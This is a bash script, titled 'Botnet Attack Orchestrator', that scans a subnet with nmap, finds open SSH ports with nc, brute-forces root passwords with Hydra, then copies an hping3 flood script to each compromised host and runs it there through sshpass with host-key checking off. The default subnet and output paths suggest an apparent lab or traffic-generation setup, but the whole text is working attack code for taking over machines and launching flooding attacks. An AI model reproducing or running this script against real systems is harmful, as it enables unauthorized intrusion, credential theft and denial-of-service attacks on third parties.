#!/bin/bash
# Botnet Attack Orchestrator
# Runs on botnet-node
# Phase 1: Scan for SSH targets in target network
# Phase 2: SSH brute-force via Hydra
# Phase 3: Deploy and execute hping3_attack.sh on compromised nodes

TARGET_NETWORK="${TARGET_NETWORK:-192.168.200.0/24}"
SSH_USER="${SSH_USER:-root}"
PASSWORD_LIST="${PASSWORD_LIST:-/usr/share/wordlists/nmap.lst}"

echo "[*] ============================================"
echo "[*] Botnet Attack Orchestration"
echo "[*] Target Network: $TARGET_NETWORK"
echo "[*] SSH User: $SSH_USER"
echo "[*] Password List: $PASSWORD_LIST"
echo "[*] ============================================"

# Phase 1: Discover live hosts with nmap
echo "[*] Phase 1: Discovering live hosts in $TARGET_NETWORK..."
nmap -sn $TARGET_NETWORK -oN /app/results/nmap_live_hosts.txt 2>&1
cat /app/results/nmap_live_hosts.txt

# Extract live host IPs
LIVE_HOSTS=$(grep -oP 'Nmap scan report for \K[\d.]+' /app/results/nmap_live_hosts.txt)
echo "[*] Live hosts found: $LIVE_HOSTS"

# Phase 2: Find SSH-enabled hosts
echo "[*] Phase 2: Scanning for SSH services..."
for host in $LIVE_HOSTS; do
  echo -n "  Checking $host:22..."
  if nc -z -w 2 $host 22 2>/dev/null; then
    echo " OPEN"
    echo "$host" >> /app/results/ssh_targets.txt
  else
    echo " closed"
  fi
done

if [ ! -f /app/results/ssh_targets.txt ]; then
  echo "[-] No SSH targets found. Exiting."
  exit 1
fi

SSH_TARGETS=$(cat /app/results/ssh_targets.txt)
echo "[*] SSH targets: $SSH_TARGETS"

# Phase 3: SSH Brute-Force with Hydra
echo "[*] Phase 3: SSH Brute-Force Attack"
for target in $SSH_TARGETS; do
  echo "[*] Attempting Hydra SSH brute-force on $target..."
  
  # Run Hydra with timeout
  hydra -l $SSH_USER -P $PASSWORD_LIST -s 22 -f -t 4 -V $target ssh 2>&1 | tee /app/results/hydra_${target//\./_}.log
  
  # Extract password from Hydra verbose output
  PASSWORD=$(grep -oP 'password: \K.*' /app/results/hydra_${target//\./_}.log | head -1)
  
  if [ -n "$PASSWORD" ]; then
    echo "[+] ============================================"
    echo "[+] COMPROMISED: $target (password: $PASSWORD)"
    echo "[+] ============================================"
    
    # Phase 4: Deploy hping3 attack script to compromised node
    echo "[*] Deploying hping3 attack script to $target..."
    
    # Copy attack script
    scp -o StrictHostKeyChecking=no /app/hping3_attack.sh root@$target:/tmp/hping3_attack.sh 2>&1 | tee -a /app/results/deployment.log
    
    # Execute attack on compromised node (in background)
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no root@$target "chmod +x /tmp/hping3_attack.sh && bash /tmp/hping3_attack.sh &" 2>&1 | tee -a /app/results/deployment.log
    
    echo "[+] hping3 attack launched from $target"
    echo "[+] Attack will run from T+60s to T+120s"
  else
    echo "[-] Failed to compromise $target"
  fi
done

echo "[*] ============================================"
echo "[*] Attack orchestration complete"
echo "[*] ============================================"